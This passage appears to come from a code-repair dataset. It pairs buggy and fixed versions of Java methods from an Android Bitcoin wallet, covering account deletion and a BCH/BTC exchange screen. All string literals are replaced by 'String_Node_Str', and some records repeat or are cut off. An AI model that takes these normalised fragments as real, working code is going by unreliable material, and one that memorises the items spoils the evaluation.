        _storage.deleteAccountMetadata(accountToDelete.getId());
        finishCurrentActionMode();
        _mbwManager.getEventBus().post(new AccountChanged(accountToDelete.getId()));
        _mbwManager.getEventBus().post(new ExtraAccountsChanged());
        _toaster.toast(R.string.account_deleted,false);
      }
    }
    private CurrencyValue getPotentialBalanceColu(    WalletAccount account){
      if (account.isArchived()) {
        return null;
      }
 else {
        CurrencyBasedBalance balance=account.getCurrencyBasedBalance();
        return balance.confirmed;
      }
    }
    private Long getPotentialBalance(    WalletAccount account){
      if (account.isArchived()) {
        return null;
      }
 else {
        Balance balance=account.getBalance();
        return balance.confirmed + balance.pendingChange + balance.pendingReceiving;
      }
    }
  }
);
  deleteDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
    }
  }
);
  deleteDialog.show();
}","private void deleteAccount(final WalletAccount accountToDelete){
  Preconditions.checkNotNull(accountToDelete);
  final View checkBoxView=View.inflate(getActivity(),R.layout.delkey_checkbox,null);
  final CheckBox keepAddrCheckbox=(CheckBox)checkBoxView.findViewById(R.id.checkbox);
  keepAddrCheckbox.setText(getString(R.string.keep_account_address));
  keepAddrCheckbox.setChecked(false);
  final AlertDialog.Builder deleteDialog=new AlertDialog.Builder(getActivity());
  deleteDialog.setTitle(R.string.delete_account_title);
  final WalletAccount account=_mbwManager.getSelectedAccount();
  final WalletAccount linkedAccount=Utils.getLinkedAccount(account,_mbwManager.getColuManager().getAccounts().values());
  if (account.getType() == WalletAccount.Type.COLU) {
    deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_rmc_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(((ColuAccount)account).getLinkedAccount().getId())));
  }
 else   if (linkedAccount != null) {
    deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_rmc_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(linkedAccount.getId())));
  }
 else {
    WalletAccount correspondingBCHAccount=_mbwManager.getWalletManager(false).getAccount(MbwManager.getBitcoinCashAccountId(account));
    if (correspondingBCHAccount != null && correspondingBCHAccount.isVisible()) {
      deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_bch_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(correspondingBCHAccount.getId())));
    }
 else {
      deleteDialog.setMessage(getString(R.string.delete_account_message));
    }
  }
  final boolean hasPrivateData=(accountToDelete instanceof ExportableAccount && ((ExportableAccount)accountToDelete).getExportData(AesKeyCipher.defaultKeyCipher()).privateData.isPresent());
  if (accountToDelete instanceof SingleAddressAccount && hasPrivateData) {
    deleteDialog.setView(checkBoxView);
  }
  if (accountToDelete instanceof ColuAccount && accountToDelete.canSpend()) {
    Log.d(TAG,""String_Node_Str"");
    deleteDialog.setView(checkBoxView);
  }
  deleteDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
      Log.d(TAG,""String_Node_Str"");
      if (hasPrivateData) {
        Long satoshis=getPotentialBalance(accountToDelete);
        AlertDialog.Builder confirmDeleteDialog=new AlertDialog.Builder(getActivity());
        confirmDeleteDialog.setTitle(R.string.confirm_delete_pk_title);
        String label=_mbwManager.getMetadataStorage().getLabelByAccount(accountToDelete.getId());
        int labelCount=1;
        if (account instanceof ColuAccount) {
          label+=""String_Node_Str"" + _mbwManager.getMetadataStorage().getLabelByAccount(((ColuAccount)account).getLinkedAccount().getId());
          labelCount++;
        }
 else         if (linkedAccount != null) {
          label+=""String_Node_Str"" + _mbwManager.getMetadataStorage().getLabelByAccount(linkedAccount.getId());
          labelCount++;
        }
        String message;
        Optional<Address> receivingAddress=accountToDelete.getReceivingAddress();
        if (accountToDelete.isActive() && satoshis != null && satoshis > 0) {
          if (label != null && label.length() != 0) {
            String address;
            if (receivingAddress.isPresent()) {
              address=receivingAddress.get().toMultiLineString();
            }
 else {
              address=""String_Node_Str"";
            }
            message=getString(R.string.confirm_delete_pk_with_balance_with_label,getResources().getQuantityString(R.plurals.account_label,labelCount,label),address,accountToDelete instanceof ColuAccount ? Utils.getColuFormattedValueWithUnit(getPotentialBalanceColu(accountToDelete)) : _mbwManager.getBtcValueString(satoshis));
          }
 else {
            message=getString(R.string.confirm_delete_pk_with_balance,receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"",accountToDelete instanceof ColuAccount ? Utils.getColuFormattedValueWithUnit(getPotentialBalanceColu(accountToDelete)) : _mbwManager.getBtcValueString(satoshis));
          }
        }
 else {
          if (label != null && label.length() != 0) {
            message=getString(R.string.confirm_delete_pk_without_balance_with_label,getResources().getQuantityString(R.plurals.account_label,labelCount,label),receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"");
          }
 else {
            message=getString(R.string.confirm_delete_pk_without_balance,receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"");
          }
        }
        confirmDeleteDialog.setMessage(message);
        confirmDeleteDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface arg0,          int arg1){
            Log.d(TAG,""String_Node_Str"");
            if (keepAddrCheckbox.isChecked() && accountToDelete instanceof SingleAddressAccount) {
              try {
                WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
                if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  coluManager.forgetPrivateKey((ColuAccount)linkedColuAccount);
                }
 else {
                  ((SingleAddressAccount)accountToDelete).forgetPrivateKey(AesKeyCipher.defaultKeyCipher());
                }
                _toaster.toast(R.string.private_key_deleted,false);
              }
 catch (              KeyCipher.InvalidKeyCipher e) {
                throw new RuntimeException(e);
              }
            }
 else {
              if (accountToDelete instanceof ColuAccount) {
                try {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  if (keepAddrCheckbox.isChecked()) {
                    coluManager.forgetPrivateKey((ColuAccount)accountToDelete);
                  }
 else {
                    coluManager.deleteAccount((ColuAccount)accountToDelete);
                    _storage.deleteAccountMetadata(accountToDelete.getId());
                    _toaster.toast(""String_Node_Str"",false);
                    _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
                    _mbwManager.getEventBus().post(new ExtraAccountsChanged());
                  }
                }
 catch (                Exception e) {
                  _toaster.toast(getString(R.string.colu_error_deleting),false);
                }
              }
 else {
                WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
                if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  coluManager.deleteAccount((ColuAccount)linkedColuAccount);
                }
 else {
                  try {
                    walletManager.deleteUnrelatedAccount(accountToDelete.getId(),AesKeyCipher.defaultKeyCipher());
                  }
 catch (                  KeyCipher.InvalidKeyCipher e) {
                    throw new RuntimeException(e);
                  }
                }
                _storage.deleteAccountMetadata(accountToDelete.getId());
                _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
                _toaster.toast(R.string.account_deleted,false);
                _mbwManager.getEventBus().post(new ExtraAccountsChanged());
              }
            }
            finishCurrentActionMode();
            _mbwManager.getEventBus().post(new AccountChanged(accountToDelete.getId()));
          }
        }
);
        confirmDeleteDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface arg0,          int arg1){
          }
        }
);
        confirmDeleteDialog.show();
      }
 else {
        if (accountToDelete instanceof ColuAccount) {
          ColuManager coluManager=_mbwManager.getColuManager();
          coluManager.deleteAccount((ColuAccount)accountToDelete);
        }
 else {
          WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
          if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
            ColuManager coluManager=_mbwManager.getColuManager();
            coluManager.deleteAccount((ColuAccount)linkedColuAccount);
            _storage.deleteAccountMetadata(linkedColuAccount.getId());
          }
 else {
            try {
              walletManager.deleteUnrelatedAccount(accountToDelete.getId(),AesKeyCipher.defaultKeyCipher());
            }
 catch (            KeyCipher.InvalidKeyCipher e) {
              throw new RuntimeException(e);
            }
          }
        }
        _storage.deleteAccountMetadata(accountToDelete.getId());
        finishCurrentActionMode();
        _mbwManager.getEventBus().post(new AccountChanged(accountToDelete.getId()));
        _mbwManager.getEventBus().post(new ExtraAccountsChanged());
        _toaster.toast(R.string.account_deleted,false);
      }
    }
    private CurrencyValue getPotentialBalanceColu(    WalletAccount account){
      if (account.isArchived()) {
        return null;
      }
 else {
        CurrencyBasedBalance balance=account.getCurrencyBasedBalance();
        return balance.confirmed;
      }
    }
    private Long getPotentialBalance(    WalletAccount account){
      if (account.isArchived()) {
        return null;
      }
 else {
        Balance balance=account.getBalance();
        return balance.confirmed + balance.pendingChange + balance.pendingReceiving;
      }
    }
  }
);
  deleteDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
    }
  }
);
  deleteDialog.show();
}"
91045,"private void updateUi(){
  try {
    exchangeFiatRate.setText(Utils.formatFiatWithUnit(mbwManager.getCurrencySwitcher().getAsFiatValue(ExactBitcoinValue.from(new BigDecimal(toValue.getText().toString())))));
  }
 catch (  NumberFormatException ignore) {
  }
  exchangeFiatRate.setVisibility(View.VISIBLE);
  exchangeRate.setText(""String_Node_Str"" + CurrencyValue.fromValue(ExactBitcoinCashValue.ONE,""String_Node_Str"",mbwManager.getExchangeRateManager()));
  exchangeRate.setVisibility(View.VISIBLE);
}","private void updateUi(){
  try {
    CurrencyValue currencyValue=mbwManager.getCurrencySwitcher().getAsFiatValue(ExactBitcoinValue.from(new BigDecimal(toValue.getText().toString())));
    if (currencyValue != null && currencyValue.getValue() != null) {
      exchangeFiatRate.setText(Utils.formatFiatWithUnit(currencyValue));
      exchangeFiatRate.setVisibility(View.VISIBLE);
    }
 else {
      exchangeFiatRate.setVisibility(View.GONE);
    }
  }
 catch (  NumberFormatException ignore) {
  }
}"
91046,"@Override public void onReceive(Context context,Intent intent){
  String from, to;
  double amount;
switch (intent.getAction()) {
case ChangellyService.INFO_MIN_AMOUNT:
    amount=intent.getDoubleExtra(ChangellyService.AMOUNT,NOT_LOADED);
  if (amount != NOT_LOADED) {
    Log.d(TAG,""String_Node_Str"" + amount);
    sharedPreferences.edit().putFloat(BCH_MIN_EXCHANGE_VALUE,(float)amount).apply();
    minAmount=amount;
  }
break;
case ChangellyService.INFO_EXCH_AMOUNT:
from=intent.getStringExtra(ChangellyService.FROM);
to=intent.getStringExtra(ChangellyService.TO);
double fromAmount=intent.getDoubleExtra(ChangellyService.FROM_AMOUNT,0);
amount=intent.getDoubleExtra(ChangellyService.AMOUNT,0);
if (from != null && to != null) {
Log.d(TAG,""String_Node_Str"" + amount + ""String_Node_Str""+ to);
avoidTextChangeEvent=true;
try {
if (to.equalsIgnoreCase(ChangellyService.BTC) && from.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(fromValue.getText().toString())) {
toValue.setText(decimalFormat.format(amount));
}
 else if (from.equalsIgnoreCase(ChangellyService.BTC) && to.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(toValue.getText().toString())) {
fromValue.setText(decimalFormat.format(amount));
}
isValueForOfferOk(true);
}
 catch (NumberFormatException ignore) {
}
avoidTextChangeEvent=false;
updateUi();
}
break;
case INFO_ERROR:
Toast.makeText(getActivity(),""String_Node_Str"",Toast.LENGTH_LONG).show();
break;
}
}","@Override public void onReceive(Context context,Intent intent){
  String from, to;
  double amount;
switch (intent.getAction()) {
case ChangellyService.INFO_MIN_AMOUNT:
    amount=intent.getDoubleExtra(ChangellyService.AMOUNT,NOT_LOADED);
  if (amount != NOT_LOADED) {
    Log.d(TAG,""String_Node_Str"" + amount);
    sharedPreferences.edit().putFloat(BCH_MIN_EXCHANGE_VALUE,(float)amount).apply();
    minAmount=amount;
  }
break;
case ChangellyService.INFO_EXCH_AMOUNT:
from=intent.getStringExtra(ChangellyService.FROM);
to=intent.getStringExtra(ChangellyService.TO);
double fromAmount=intent.getDoubleExtra(ChangellyService.FROM_AMOUNT,0);
amount=intent.getDoubleExtra(ChangellyService.AMOUNT,0);
if (from != null && to != null) {
Log.d(TAG,""String_Node_Str"" + amount + ""String_Node_Str""+ to);
avoidTextChangeEvent=true;
try {
if (to.equalsIgnoreCase(ChangellyService.BTC) && from.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(fromValue.getText().toString())) {
toValue.setText(decimalFormat.format(amount));
exchangeRate.setText(""String_Node_Str"" + decimalFormat.format(amount / fromAmount) + ""String_Node_Str"");
exchangeRate.setVisibility(View.VISIBLE);
}
 else if (from.equalsIgnoreCase(ChangellyService.BTC) && to.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(toValue.getText().toString())) {
fromValue.setText(decimalFormat.format(amount));
exchangeRate.setText(""String_Node_Str"" + decimalFormat.format(fromAmount / amount) + ""String_Node_Str"");
exchangeRate.setVisibility(View.VISIBLE);
}
isValueForOfferOk(true);
}
 catch (NumberFormatException ignore) {
}
avoidTextChangeEvent=false;
updateUi();
}
break;
case INFO_ERROR:
new AlertDialog.Builder(getActivity()).setMessage(getString(R.string.exchange_rate_unavailable_msg)).setNegativeButton(R.string.button_cancel,null).setPositiveButton(R.string.try_again,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialogInterface,int i){
BigDecimal val=new BigDecimal(fromValue.getText().toString());
requestOfferFunction(val.toPlainString(),ChangellyService.BCH,ChangellyService.BTC);
}
}
).show();
break;
}
}"
91047,"boolean isValueForOfferOk(boolean checkMin){
  tvError.setVisibility(View.GONE);
  String txtAmount=fromValue.getText().toString();
  if (txtAmount.isEmpty()) {
    buttonContinue.setEnabled(false);
    return false;
  }
  Double dblAmount;
  try {
    dblAmount=Double.parseDouble(txtAmount);
  }
 catch (  NumberFormatException e) {
    toast(""String_Node_Str"");
    buttonContinue.setEnabled(false);
    return false;
  }
  WalletAccount fromAccount=fromAccountAdapter.getItem(fromRecyclerView.getSelectedItem()).account;
  if (checkMin && minAmount == NOT_LOADED) {
    buttonContinue.setEnabled(false);
    toast(""String_Node_Str"");
    return false;
  }
 else   if (checkMin && dblAmount.compareTo(minAmount) < 0) {
    buttonContinue.setEnabled(false);
    tvError.setText(getString(R.string.exchange_minimum_amount,decimalFormat.format(minAmount),""String_Node_Str""));
    tvError.setVisibility(View.VISIBLE);
    scrollTo(tvError.getTop());
    return false;
  }
 else   if (fromAccount.getCurrencyBasedBalance().confirmed.getValue().compareTo(BigDecimal.valueOf(dblAmount)) < 0) {
    buttonContinue.setEnabled(false);
    tvError.setText(R.string.balance_error);
    tvError.setVisibility(View.VISIBLE);
    return false;
  }
  buttonContinue.setEnabled(true);
  return true;
}","boolean isValueForOfferOk(boolean checkMin){
  tvError.setVisibility(View.GONE);
  String txtAmount=fromValue.getText().toString();
  if (txtAmount.isEmpty()) {
    buttonContinue.setEnabled(false);
    return false;
  }
  Double dblAmount;
  try {
    dblAmount=Double.parseDouble(txtAmount);
  }
 catch (  NumberFormatException e) {
    toast(""String_Node_Str"");
    buttonContinue.setEnabled(false);
    return false;
  }
  WalletAccount fromAccount=fromAccountAdapter.getItem(fromRecyclerView.getSelectedItem()).account;
  if (checkMin && minAmount == NOT_LOADED) {
    buttonContinue.setEnabled(false);
    toast(""String_Node_Str"");
    return false;
  }
 else   if (checkMin && dblAmount.compareTo(minAmount) < 0) {
    buttonContinue.setEnabled(false);
    if (dblAmount != 0) {
      tvError.setText(getString(R.string.exchange_minimum_amount,decimalFormat.format(minAmount),""String_Node_Str""));
      tvError.setVisibility(View.VISIBLE);
    }
    scrollTo(tvError.getTop());
    return false;
  }
 else   if (fromAccount.getCurrencyBasedBalance().confirmed.getValue().compareTo(BigDecimal.valueOf(dblAmount)) < 0) {
    buttonContinue.setEnabled(false);
    tvError.setText(R.string.balance_error);
    tvError.setVisibility(View.VISIBLE);
    return false;
  }
  buttonContinue.setEnabled(true);
  return true;
}"
91048,"@OnClick(R.id.toValueLayout) void toValueClick(){
  valueKeyboard.setInputTextView(toValue);
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setEntry(toValue.getText().toString());
  toLayout.setAlpha(Constants.ACTIVE_ALPHA);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  valueKeyboard.setSpendableValue(BigDecimal.ZERO);
  valueKeyboard.setMaxValue(MAX_BITCOIN_VALUE);
  scrollView.post(new Runnable(){
    @Override public void run(){
      scrollView.smoothScrollTo(0,toLayout.getBottom());
    }
  }
);
}","@OnClick(R.id.toValueLayout) void toValueClick(){
  valueKeyboard.setInputTextView(toValue);
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setEntry(toValue.getText().toString());
  toLayout.setAlpha(Constants.ACTIVE_ALPHA);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  valueKeyboard.setSpendableValue(BigDecimal.ZERO);
  valueKeyboard.setMaxValue(MAX_BITCOIN_VALUE);
  scrollTo(toLayout.getBottom());
}"
91049,"boolean isValueForOfferOk(boolean checkMin){
  tvError.setVisibility(View.GONE);
  String txtAmount=fromValue.getText().toString();
  if (txtAmount.isEmpty()) {
    buttonContinue.setEnabled(false);
    return false;
  }
  Double dblAmount;
  try {
    dblAmount=Double.parseDouble(txtAmount);
  }
 catch (  NumberFormatException e) {
    toast(""String_Node_Str"");
    buttonContinue.setEnabled(false);
    return false;
  }
  WalletAccount fromAccount=fromAccountAdapter.getItem(fromRecyclerView.getSelectedItem()).account;
  if (checkMin && minAmount == NOT_LOADED) {
    buttonContinue.setEnabled(false);
    toast(""String_Node_Str"");
    return false;
  }
 else   if (checkMin && dblAmount.compareTo(minAmount) < 0) {
    buttonContinue.setEnabled(false);
    tvError.setText(getString(R.string.exchange_minimum_amount,decimalFormat.format(minAmount),""String_Node_Str""));
    tvError.setVisibility(View.VISIBLE);
    return false;
  }
 else   if (fromAccount.getCurrencyBasedBalance().confirmed.getValue().compareTo(BigDecimal.valueOf(dblAmount)) < 0) {
    buttonContinue.setEnabled(false);
    tvError.setText(R.string.balance_error);
    tvError.setVisibility(View.VISIBLE);
    return false;
  }
  buttonContinue.setEnabled(true);
  return true;
}","boolean isValueForOfferOk(boolean checkMin){
  tvError.setVisibility(View.GONE);
  String txtAmount=fromValue.getText().toString();
  if (txtAmount.isEmpty()) {
    buttonContinue.setEnabled(false);
    return false;
  }
  Double dblAmount;
  try {
    dblAmount=Double.parseDouble(txtAmount);
  }
 catch (  NumberFormatException e) {
    toast(""String_Node_Str"");
    buttonContinue.setEnabled(false);
    return false;
  }
  WalletAccount fromAccount=fromAccountAdapter.getItem(fromRecyclerView.getSelectedItem()).account;
  if (checkMin && minAmount == NOT_LOADED) {
    buttonContinue.setEnabled(false);
    toast(""String_Node_Str"");
    return false;
  }
 else   if (checkMin && dblAmount.compareTo(minAmount) < 0) {
    buttonContinue.setEnabled(false);
    tvError.setText(getString(R.string.exchange_minimum_amount,decimalFormat.format(minAmount),""String_Node_Str""));
    tvError.setVisibility(View.VISIBLE);
    scrollTo(tvError.getTop());
    return false;
  }
 else   if (fromAccount.getCurrencyBasedBalance().confirmed.getValue().compareTo(BigDecimal.valueOf(dblAmount)) < 0) {
    buttonContinue.setEnabled(false);
    tvError.setText(R.string.balance_error);
    tvError.setVisibility(View.VISIBLE);
    return false;
  }
  buttonContinue.setEnabled(true);
  return true;
}"
91050,"@OnClick(R.id.buttonContinue) void continueClick(){
  String txtAmount=fromValue.getText().toString();
  Double dblAmount;
  try {
    dblAmount=Double.parseDouble(txtAmount);
  }
 catch (  NumberFormatException e) {
    toast(""String_Node_Str"");
    buttonContinue.setEnabled(false);
    return;
  }
  Fragment fragment=new ConfirmExchangeFragment();
  Bundle bundle=new Bundle();
  bundle.putDouble(Constants.FROM_AMOUNT,dblAmount);
  WalletAccount toAccount=toAccountAdapter.getItem(toRecyclerView.getSelectedItem()).account;
  bundle.putSerializable(Constants.DESTADDRESS,toAccount.getId());
  WalletAccount fromAccount=fromAccountAdapter.getItem(fromRecyclerView.getSelectedItem()).account;
  bundle.putSerializable(Constants.FROM_ADDRESS,fromAccount.getId());
  fragment.setArguments(bundle);
  getFragmentManager().beginTransaction().replace(R.id.fragment_container,fragment,""String_Node_Str"").addToBackStack(""String_Node_Str"").commitAllowingStateLoss();
}","@OnClick(R.id.buttonContinue) void continueClick(){
  String txtAmount=fromValue.getText().toString();
  Double dblAmount;
  try {
    dblAmount=Double.parseDouble(txtAmount);
  }
 catch (  NumberFormatException e) {
    toast(""String_Node_Str"");
    buttonContinue.setEnabled(false);
    return;
  }
  Fragment fragment=new ConfirmExchangeFragment();
  Bundle bundle=new Bundle();
  bundle.putDouble(Constants.FROM_AMOUNT,dblAmount);
  WalletAccount toAccount=toAccountAdapter.getItem(toRecyclerView.getSelectedItem()).account;
  bundle.putSerializable(Constants.DESTADDRESS,toAccount.getId());
  WalletAccount fromAccount=fromAccountAdapter.getItem(fromRecyclerView.getSelectedItem()).account;
  bundle.putSerializable(Constants.FROM_ADDRESS,fromAccount.getId());
  fragment.setArguments(bundle);
  getFragmentManager().beginTransaction().add(R.id.fragment_container,fragment,""String_Node_Str"").addToBackStack(""String_Node_Str"").commitAllowingStateLoss();
}"
91051,"@Override public void run(){
  scrollView.smoothScrollTo(0,fromLayout.getTop());
}","@Override public void run(){
  scrollView.smoothScrollTo(0,to);
}"
91052,"@OnClick(R.id.fromValueLayout) void fromValueClick(){
  valueKeyboard.setInputTextView(fromValue);
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setEntry(fromValue.getText().toString());
  fromLayout.setAlpha(Constants.ACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
  AccountAdapter.Item item=fromAccountAdapter.getItem(fromRecyclerView.getSelectedItem());
  valueKeyboard.setSpendableValue(getMaxSpend(item.account));
  valueKeyboard.setMaxValue(MAX_BITCOIN_VALUE);
  scrollView.post(new Runnable(){
    @Override public void run(){
      scrollView.smoothScrollTo(0,fromLayout.getTop());
    }
  }
);
}","@OnClick(R.id.fromValueLayout) void fromValueClick(){
  valueKeyboard.setInputTextView(fromValue);
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setEntry(fromValue.getText().toString());
  fromLayout.setAlpha(Constants.ACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
  AccountAdapter.Item item=fromAccountAdapter.getItem(fromRecyclerView.getSelectedItem());
  valueKeyboard.setSpendableValue(getMaxSpend(item.account));
  valueKeyboard.setMaxValue(MAX_BITCOIN_VALUE);
  scrollTo(fromLayout.getTop());
}"
91053,"private void updateUi(){
  try {
    exchangeFiatRate.setText(Utils.formatFiatWithUnit(mbwManager.getCurrencySwitcher().getAsFiatValue(ExactBitcoinValue.from(new BigDecimal(toValue.getText().toString())))));
  }
 catch (  NumberFormatException ignore) {
  }
  exchangeFiatRate.setVisibility(View.VISIBLE);
  exchangeRate.setText(""String_Node_Str"" + CurrencyValue.fromValue(ExactBitcoinCashValue.ONE,""String_Node_Str"",mbwManager.getExchangeRateManager()));
  exchangeRate.setVisibility(View.VISIBLE);
}","private void updateUi(){
  try {
    CurrencyValue currencyValue=mbwManager.getCurrencySwitcher().getAsFiatValue(ExactBitcoinValue.from(new BigDecimal(toValue.getText().toString())));
    if (currencyValue != null && currencyValue.getValue() != null) {
      exchangeFiatRate.setText(Utils.formatFiatWithUnit(currencyValue));
      exchangeFiatRate.setVisibility(View.VISIBLE);
    }
 else {
      exchangeFiatRate.setVisibility(View.GONE);
    }
  }
 catch (  NumberFormatException ignore) {
  }
}"
91054,"@Override public void onReceive(Context context,Intent intent){
  String from, to;
  double amount;
switch (intent.getAction()) {
case ChangellyService.INFO_MIN_AMOUNT:
    amount=intent.getDoubleExtra(ChangellyService.AMOUNT,NOT_LOADED);
  if (amount != NOT_LOADED) {
    Log.d(TAG,""String_Node_Str"" + amount);
    sharedPreferences.edit().putFloat(BCH_MIN_EXCHANGE_VALUE,(float)amount).apply();
    minAmount=amount;
  }
break;
case ChangellyService.INFO_EXCH_AMOUNT:
from=intent.getStringExtra(ChangellyService.FROM);
to=intent.getStringExtra(ChangellyService.TO);
double fromAmount=intent.getDoubleExtra(ChangellyService.FROM_AMOUNT,0);
amount=intent.getDoubleExtra(ChangellyService.AMOUNT,0);
if (from != null && to != null) {
Log.d(TAG,""String_Node_Str"" + amount + ""String_Node_Str""+ to);
avoidTextChangeEvent=true;
try {
if (to.equalsIgnoreCase(ChangellyService.BTC) && from.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(fromValue.getText().toString())) {
toValue.setText(decimalFormat.format(amount));
}
 else if (from.equalsIgnoreCase(ChangellyService.BTC) && to.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(toValue.getText().toString())) {
fromValue.setText(decimalFormat.format(amount));
}
isValueForOfferOk(true);
}
 catch (NumberFormatException ignore) {
}
avoidTextChangeEvent=false;
updateUi();
}
break;
case INFO_ERROR:
Toast.makeText(getActivity(),""String_Node_Str"",Toast.LENGTH_LONG).show();
break;
}
}","@Override public void onReceive(Context context,Intent intent){
  String from, to;
  double amount;
switch (intent.getAction()) {
case ChangellyService.INFO_MIN_AMOUNT:
    amount=intent.getDoubleExtra(ChangellyService.AMOUNT,NOT_LOADED);
  if (amount != NOT_LOADED) {
    Log.d(TAG,""String_Node_Str"" + amount);
    sharedPreferences.edit().putFloat(BCH_MIN_EXCHANGE_VALUE,(float)amount).apply();
    minAmount=amount;
  }
break;
case ChangellyService.INFO_EXCH_AMOUNT:
from=intent.getStringExtra(ChangellyService.FROM);
to=intent.getStringExtra(ChangellyService.TO);
double fromAmount=intent.getDoubleExtra(ChangellyService.FROM_AMOUNT,0);
amount=intent.getDoubleExtra(ChangellyService.AMOUNT,0);
if (from != null && to != null) {
Log.d(TAG,""String_Node_Str"" + amount + ""String_Node_Str""+ to);
avoidTextChangeEvent=true;
try {
if (to.equalsIgnoreCase(ChangellyService.BTC) && from.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(fromValue.getText().toString())) {
toValue.setText(decimalFormat.format(amount));
exchangeRate.setText(""String_Node_Str"" + decimalFormat.format(amount / fromAmount) + ""String_Node_Str"");
exchangeRate.setVisibility(View.VISIBLE);
}
 else if (from.equalsIgnoreCase(ChangellyService.BTC) && to.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(toValue.getText().toString())) {
fromValue.setText(decimalFormat.format(amount));
exchangeRate.setText(""String_Node_Str"" + decimalFormat.format(fromAmount / amount) + ""String_Node_Str"");
exchangeRate.setVisibility(View.VISIBLE);
}
isValueForOfferOk(true);
}
 catch (NumberFormatException ignore) {
}
avoidTextChangeEvent=false;
updateUi();
}
break;
case INFO_ERROR:
new AlertDialog.Builder(getActivity()).setMessage(getString(R.string.exchange_rate_unavailable_msg)).setNegativeButton(R.string.button_cancel,null).setPositiveButton(R.string.try_again,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialogInterface,int i){
BigDecimal val=new BigDecimal(fromValue.getText().toString());
requestOfferFunction(val.toPlainString(),ChangellyService.BCH,ChangellyService.BTC);
}
}
).show();
break;
}
}"
91055,"@Override public void onCreate(Bundle savedInstanceState){
  this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);
  super.onCreate(savedInstanceState);
  setContentView(R.layout.add_account_activity);
  ButterKnife.bind(this);
  _mbwManager=MbwManager.getInstance(this);
  _toaster=new Toaster(this);
  findViewById(R.id.btAdvanced).setOnClickListener(advancedClickListener);
  findViewById(R.id.btHdCreate).setOnClickListener(createHdAccount);
  final View coinapultUSD=findViewById(R.id.btCoinapultCreate);
  coinapultUSD.setOnClickListener(createCoinapultAccount);
  if (_mbwManager.getMetadataStorage().getMasterSeedBackupState() == MetadataStorage.BackupState.VERIFIED) {
    findViewById(R.id.tvWarningNoBackup).setVisibility(View.GONE);
  }
 else {
    findViewById(R.id.tvInfoBackup).setVisibility(View.GONE);
  }
  final View coluCreate=findViewById(R.id.btColuCreate);
  coluCreate.setOnClickListener(createColuAccount);
  _progress=new ProgressDialog(this);
}","@Override public void onCreate(Bundle savedInstanceState){
  this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);
  super.onCreate(savedInstanceState);
  setContentView(R.layout.add_account_activity);
  ButterKnife.bind(this);
  _mbwManager=MbwManager.getInstance(this);
  _toaster=new Toaster(this);
  findViewById(R.id.btAdvanced).setOnClickListener(advancedClickListener);
  findViewById(R.id.btHdCreate).setOnClickListener(createHdAccount);
  final View coinapultUSD=findViewById(R.id.btCoinapultCreate);
  coinapultUSD.setOnClickListener(createCoinapultAccount);
  if (_mbwManager.getMetadataStorage().getMasterSeedBackupState() == MetadataStorage.BackupState.VERIFIED) {
    findViewById(R.id.tvWarningNoBackup).setVisibility(View.GONE);
  }
 else {
    findViewById(R.id.tvInfoBackup).setVisibility(View.GONE);
  }
  final View coluCreate=findViewById(R.id.btColuCreate);
